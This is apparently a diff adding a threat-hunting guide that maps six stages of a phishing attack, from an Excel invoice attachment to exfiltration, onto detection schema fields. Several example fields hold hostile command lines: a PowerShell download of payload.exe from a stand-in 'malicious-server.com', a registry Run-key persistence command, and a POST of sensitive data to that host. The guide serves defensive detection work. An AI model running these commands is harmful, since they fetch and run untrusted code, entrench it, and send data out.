@@ -1,0 +1,57 @@
+1. **Identify Initial Access via Email**  
+   - Monitor for the creation of processes related to Outlook that involve email interactions. Specifically, look for emails with subject lines containing "Important Update" and attachments named "Invoice_2023.xlsx".  
+   - Schema Fields:  
+     - `srcNode.Type`: "Process"  
+     - `srcNode.Image`: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE" (or similar path for Outlook)  
+     - `dstNode.Type`: "File"  
+     - `dstNode.Name`: "Invoice_2023.xlsx"  
+     - `relation`: "Process Create"  
+
+2. **Identify Opening of the Malicious Attachment**  
+   - Monitor for the execution of Microsoft Excel when the user opens the attachment "Invoice_2023.xlsx".  
+   - Schema Fields:  
+     - `srcNode.Type`: "Process"  
+     - `srcNode.Image`: "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" (or similar path for Excel)  
+     - `dstNode.Type`: "File"  
+     - `dstNode.Name`: "Invoice_2023.xlsx"  
+     - `relation`: "Process Create"  
+
+3. **Identify Macro Execution and Payload Download**  
+   - Monitor for PowerShell commands that include `Invoke-WebRequest` to download a file from a remote server.  
+   - Schema Fields:  
+     - `srcNode.Type`: "Process"  
+     - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
+     - `dstNode.Type`: "File"  
+     - `dstNode.Name`: "payload.exe"  
+     - `relation`: "Process Create"  
+     - `dstNode.Cmdline`: `Invoke-WebRequest -Uri "http://malicious-server.com/payload.exe" -OutFile "C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe"`  
+
+4. **Identify Execution of the Malicious Payload**  
+   - Monitor for the execution of the downloaded payload from the Temp directory.  
+   - Schema Fields:  
+     - `srcNode.Type`: "Process"  
+     - `srcNode.Image`: "C:\\Windows\\System32\\cmd.exe" (or similar path for Command Prompt)  
+     - `dstNode.Type`: "Process"  
+     - `dstNode.Image`: "C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe"  
+     - `relation`: "Process Create"  
+     - `dstNode.Cmdline`: `C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe`  
+
+5. **Identify Registry Modifications for Persistence**  
+   - Monitor for registry modifications that establish persistence for the malicious payload.  
+   - Schema Fields:  
+     - `srcNode.Type`: "Process"  
+     - `srcNode.Image`: "C:\\Windows\\System32\\reg.exe"  
+     - `dstNode.Type`: "Registry"  
+     - `dstNode.Key`: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MaliciousApp"  
+     - `relation`: "RegSetValue"  
+     - `dstNode.Cmdline`: `reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v MaliciousApp /t REG_SZ /d "C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe" /f`  
+
+6. **Identify Data Exfiltration Attempts**  
+   - Monitor for outbound network connections to known malicious domains, particularly during the execution of PowerShell commands that exfiltrate data.  
+   - Schema Fields:  
+     - `srcNode.Type`: "Process"  
+     - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
+     - `dstNode.Type`: "Network"  
+     - `dstNode.Dstaddress`: "malicious-server.com"  
+     - `relation`: "TCP Connect"  
+     - `dstNode.Cmdline`: `Invoke-WebRequest -Uri "http://malicious-server.com/exfil" -Method POST -Body $sensitiveData`  
